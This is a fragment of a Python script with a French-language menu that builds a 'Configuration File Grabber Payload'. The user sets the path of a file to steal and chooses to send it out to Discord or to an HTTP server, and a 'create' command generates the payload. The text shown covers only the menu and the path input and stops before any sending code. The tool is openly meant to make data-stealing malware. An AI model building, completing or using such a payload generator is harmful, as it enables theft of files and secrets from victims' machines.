import os
from colorama import Fore, Style

def clear():
    os.system("cls")

def affichage():
    clear()
    print("=== Configuration File Grabber Payload ===\n\n")
    print(f"""
          
          {Fore.YELLOW}Options : 

    {Fore.WHITE}1. Chemin du fichier à voler
          
    {Fore.YELLOW}Sortie et envoi:
{Fore.WHITE}
    2. Envoi du fichier sur discord
    3. Envoi du fichier sur serveur HTTP

              {Fore.GREEN}
Tapez : set <num> pour configurer
Tapez : show pour afficher la config
Tapez : create pour générer
Tapez : exit pour quitter{Style.RESET_ALL}""")
    
def filegrab():
    clear()
    affichage()
    choix = {
        "Chemin du fichier à voler": None,
        "Envoi du fichier sur discord": None,
        "Envoi du fichier sur serveur HTTP": None,
    }

    def chemin_option():
        clear()
        path = input("Entrez le chemin complet du fichier à voler : ")
        if os.path.isfile(path):
            choix["Chemin du fichier à voler"] = path
        else:
            print("Le chemin spécifié n'est pas valide.")
        affichage()
    